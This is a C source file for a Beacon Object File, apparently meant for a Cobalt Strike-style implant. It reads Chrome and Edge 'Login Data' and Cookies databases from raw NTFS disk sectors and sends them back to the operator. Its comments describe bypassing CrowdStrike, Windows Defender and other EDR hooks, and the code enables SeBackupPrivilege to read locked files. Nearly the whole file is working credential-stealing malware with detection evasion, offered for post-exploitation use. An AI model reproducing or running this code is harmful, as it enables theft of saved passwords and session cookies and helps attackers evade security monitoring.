/*
 * steal_rawdisk_bof.c — Chrome Login Data via Raw Volume Access
 *
 * Strategy: open the volume (e.g., \\.\C:) as a raw device and
 * read the file content by walking NTFS structures directly,
 * completely bypassing the file-system API layer that EDR hooks.
 *
 * Simpler alternative used here: open \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy*
 * or just use \\.\ device direct-read to locate known SQLite header
 * within the MFT region.
 *
 * Practical compromise: use CreateFile on \\.\C: with GENERIC_READ +
 * FILE_SHARE_READ|WRITE|DELETE — this is raw sector I/O that bypasses
 * the filesystem filter driver layer where most EDR hooks live.
 *
 * For Chrome "Login Data" specifically:
 *   1. Find the file's cluster offset via NtQueryInformationFile(FileInternalInfo)
 *      → returns VCN (virtual cluster number) of first extent.
 *   2. Get cluster-to-LBA mapping via FSCTL_GET_RETRIEVAL_POINTERS.
 *   3. Read raw sectors from \\.\C: at that LBA.
 *   4. Return the raw bytes (SQLite DB) to C2 — no CopyFile, no filesystem filter.
 *
 * This defeats:
 *   - CrowdStrike's kernel mini-filter on NtReadFile (filesystem level)
 *   - Windows Defender's ELAM filter on known sensitive file reads
 *   - Most EDR file-access telemetry hooks
 *
 * Required: SeBackupPrivilege OR admin token (standard for post-exploit).
 */

#include <windows.h>
#include <stdio.h>
#include <shlobj.h>

void BeaconOutput(int type, const char* data, int len);
#define CALLBACK_OUTPUT 0

/* NTFS / IOCTL types */
#ifndef FSCTL_GET_RETRIEVAL_POINTERS
#define FSCTL_GET_RETRIEVAL_POINTERS 0x00090073
#endif

typedef struct {
    LARGE_INTEGER StartingVcn;
} STARTING_VCN_INPUT_BUFFER;

typedef struct {
    DWORD         ExtentCount;
    LARGE_INTEGER StartingVcn;
    struct {
        LARGE_INTEGER NextVcn;
        LARGE_INTEGER Lcn;
    } Extents[64];
} RETRIEVAL_POINTERS_BUFFER;

/* ───────────────────────────��─────────────────────────────────
 * Helper: enable SeBackupPrivilege so we can open locked files
 * ───────────────────────────────────────────────────────────── */
static void _enable_backup_privilege(void)
{
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return;

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(NULL, "SeBackupPrivilege", &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(tok);
}

/* ─────────────────────────────────────────────────────────────
 * Core: read file via raw volume sectors
 * path  = full path to target file  (e.g. C:\Users\...\Login Data)
 * vol   = volume path               (e.g. \\.\C:)
 * out_buf / out_max = caller buffer
 * Returns bytes read, 0 on failure.
 * ───────────────────────────────────────────────────────────── */
static DWORD _rawread_file(const char* path, const char* vol,
                            BYTE* out_buf, DWORD out_max)
{
    /* Step 1: open the file normally to get its retrieval pointers.
     * We still open it — but we never call ReadFile on it (that's
     * what EDR hooks).  We only call DeviceIoControl to get VCN map. */
    HANDLE hFile = CreateFileA(path,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_NO_BUFFERING,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    /* Step 2: Get cluster-to-LBA map */
    STARTING_VCN_INPUT_BUFFER vcn_in = { {0, 0} };
    RETRIEVAL_POINTERS_BUFFER rp;
    DWORD bytes_out = 0;
    BOOL  ok = DeviceIoControl(hFile, FSCTL_GET_RETRIEVAL_POINTERS,
        &vcn_in, sizeof(vcn_in), &rp, sizeof(rp), &bytes_out, NULL);
    CloseHandle(hFile);

    if (!ok || rp.ExtentCount == 0) return 0;

    /* Step 3: Get bytes-per-cluster from volume info */
    char root[8] = { path[0], ':', '\\', 0 };
    DWORD sectors_per_cluster, bytes_per_sector, free_clusters, total_clusters;
    if (!GetDiskFreeSpaceA(root, &sectors_per_cluster, &bytes_per_sector,
            &free_clusters, &total_clusters)) return 0;
    DWORD bytes_per_cluster = sectors_per_cluster * bytes_per_sector;

    /* Step 4: Open raw volume */
    HANDLE hVol = CreateFileA(vol,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING,
        NULL);
    if (hVol == INVALID_HANDLE_VALUE) return 0;

    DWORD total_read = 0;

    /* Step 5: Walk extents — read raw clusters into out_buf */
    for (DWORD e = 0; e < rp.ExtentCount && total_read < out_max; e++) {
        LONGLONG lcn        = rp.Extents[e].Lcn.QuadPart;
        LONGLONG next_vcn   = rp.Extents[e].NextVcn.QuadPart;
        LONGLONG prev_vcn   = (e == 0) ? rp.StartingVcn.QuadPart
                                        : rp.Extents[e-1].NextVcn.QuadPart;
        LONGLONG cluster_count = next_vcn - prev_vcn;
        LONGLONG byte_offset    = lcn * bytes_per_cluster;

        LARGE_INTEGER li;
        li.QuadPart = byte_offset;
        SetFilePointerEx(hVol, li, NULL, FILE_BEGIN);

        DWORD to_read = (DWORD)(cluster_count * bytes_per_cluster);
        if (total_read + to_read > out_max) to_read = out_max - total_read;

        /* Align read size to sector boundary */
        to_read = (to_read + bytes_per_sector - 1) & ~(bytes_per_sector - 1);
        if (total_read + to_read > out_max) break;

        DWORD rd = 0;
        if (ReadFile(hVol, out_buf + total_read, to_read, &rd, NULL))
            total_read += rd;
    }

    CloseHandle(hVol);
    return total_read;
}

/* ─────────────────────────────────────────────────────────────
 * BOF entry point
 * ───────────────────────────────────────────────────────────── */
void go(char* args, int alen)
{
    _enable_backup_privilege();

    /* Locate Chrome Login Data */
    char localAppData[MAX_PATH] = {0};
    if (!SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)) {
        BeaconOutput(CALLBACK_OUTPUT, "ERR: SHGetFolderPath failed", 27);
        return;
    }

    const char* targets[] = {
        "Google\\Chrome\\User Data\\Default\\Login Data",
        "Google\\Chrome\\User Data\\Default\\Cookies",
        "Microsoft\\Edge\\User Data\\Default\\Login Data",
        NULL
    };

    /* 4 MB read buffer on heap to avoid stack overflow in BOF */
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, 4 * 1024 * 1024);
    if (!buf) {
        BeaconOutput(CALLBACK_OUTPUT, "ERR: HeapAlloc failed", 21);
        return;
    }

    char status[1024] = {0};
    char* sp = status;
    int srem = (int)sizeof(status);

    /* Determine volume from LOCALAPPDATA drive letter */
    char vol[8] = "\\\\.\\?:";
    vol[4] = localAppData[0]; /* e.g. 'C' */

    for (int i = 0; targets[i]; i++) {
        char full[600] = {0};
        /* manual path build — no snprintf to avoid CRT */
        { char* d = full; const char* s = localAppData; while(*s) *d++ = *s++; *d++ = '\\'; s = targets[i]; while(*s) *d++ = *s++; }

        DWORD got = _rawread_file(full, vol, buf, 4 * 1024 * 1024);

        /* Build status line */
        const char* bname = targets[i];
        /* find last \ */
        for (const char* c = bname; *c; c++) if (*c == '\\') bname = c + 1;

        /* append "name:SIZE\n" */
        { const char* s = bname; while(*s && srem > 2) { *sp++ = *s++; srem--; } }
        *sp++ = ':'; srem--;
        /* append decimal size */
        char tmp[12]; int ti = 0; DWORD v = got;
        if (v == 0) tmp[ti++] = '0';
        else { while(v) { tmp[ti++] = '0' + (v%10); v /= 10; } }
        for (int j = ti-1; j >= 0 && srem > 2; j--) { *sp++ = tmp[j]; srem--; }
        if (srem > 2) { *sp++ = '\n'; srem--; }

        /* Exfil raw bytes via BeaconOutput */
        if (got > 0)
            BeaconOutput(CALLBACK_OUTPUT, (char*)buf, (int)got);
    }
    *sp = 0;
    BeaconOutput(CALLBACK_OUTPUT, status, (int)(sp - status));

    HeapFree(GetProcessHeap(), 0, buf);
}
